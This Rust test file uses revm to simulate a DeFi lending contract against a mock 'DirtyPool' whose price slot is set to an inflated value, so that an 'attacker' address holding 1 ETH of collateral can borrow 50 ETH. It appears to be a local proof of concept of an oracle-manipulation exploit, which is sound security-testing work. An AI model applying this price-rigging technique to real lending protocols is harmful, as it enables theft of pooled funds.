use alloy_primitives::{Address, Bytes, U256};
use alloy_sol_types::{sol, SolCall};
use revm::Database;
use revm::db::{CacheDB, EmptyDB};
use revm::primitives::{AccountInfo, Bytecode, TransactTo, SpecId};
use revm::Evm;

sol! {
    function borrow(uint256 amount, address pool) external;
}

#[test]
fn test_borrow_loan_recorded() {
    let lender_hex = std::fs::read_to_string("mocks/LendX.hex")
        .unwrap().trim().to_string();
    let pool_hex = std::fs::read_to_string("mocks/DirtyPool.hex")
        .unwrap().trim().to_string();

    let lender_code = Bytecode::new_raw(hex::decode(&lender_hex).unwrap().into());
    let pool_code   = Bytecode::new_raw(hex::decode(&pool_hex).unwrap().into());

    let mut db = CacheDB::new(EmptyDB::new());
    let lender_addr = Address::repeat_byte(0x20);
    let attacker    = Address::repeat_byte(0xde);
    let pool_addr   = Address::repeat_byte(0x10);

    // Deploy both contracts
    db.insert_account_info(lender_addr, AccountInfo {
        balance: U256::from(1000_000_000_000_000_000_000u128),
        nonce: 1, code: Some(lender_code), code_hash: Default::default(),
    });
    db.insert_account_info(pool_addr, AccountInfo {
        balance: U256::ZERO, nonce: 1,
        code: Some(pool_code), code_hash: Default::default(),
    });

    // Set pool price to 100 ETH (slot 0 – virtualPrice)
    db.insert_account_storage(pool_addr, U256::from(0), U256::from(100_000_000_000_000_000_000u128)).unwrap();

    // Attacker collateral (1 ETH)
    let coll_slot = mapping_slot(attacker, U256::from(0));
    db.insert_account_storage(lender_addr, coll_slot, U256::from(1_000_000_000_000_000_000u128)).unwrap();

    let loan_slot = mapping_slot(attacker, U256::from(1));
    let borrow_amount = U256::from(50) * U256::from(10).pow(U256::from(18));
    let calldata = borrowCall::new((borrow_amount, pool_addr)).abi_encode();

    println!("Pool price: {:?}", db.storage(pool_addr, U256::from(0)).unwrap());
    println!("Loan before: {:?}", db.storage(lender_addr, loan_slot).unwrap_or(U256::ZERO));

    {
        let mut evm = Evm::builder()
            .with_db(&mut db)
            .with_spec_id(SpecId::LATEST)
            .build();
        *evm.tx_mut() = revm::primitives::TxEnv {
            caller: attacker,
            transact_to: TransactTo::Call(lender_addr),
            data: Bytes::from(calldata),
            value: U256::ZERO,
            ..Default::default()
        };
        let result = evm.transact_commit();
        println!("Exec result: {:?}", result);
    }

    let loan_after = db.storage(lender_addr, loan_slot).unwrap_or(U256::ZERO);
    println!("Loan after: {:?}", loan_after);
    assert!(loan_after > U256::ZERO, "Loan was not recorded!");
    println!("✅ Borrow executed successfully, loan recorded.");
}

fn mapping_slot(user: Address, base_slot: U256) -> U256 {
    let mut preimage = [0u8; 64];
    preimage[12..32].copy_from_slice(user.as_ref());
    preimage[32..64].copy_from_slice(&base_slot.to_be_bytes::<32>());
    let key = alloy_primitives::keccak256(preimage);
    U256::from_be_bytes(key.0)
}
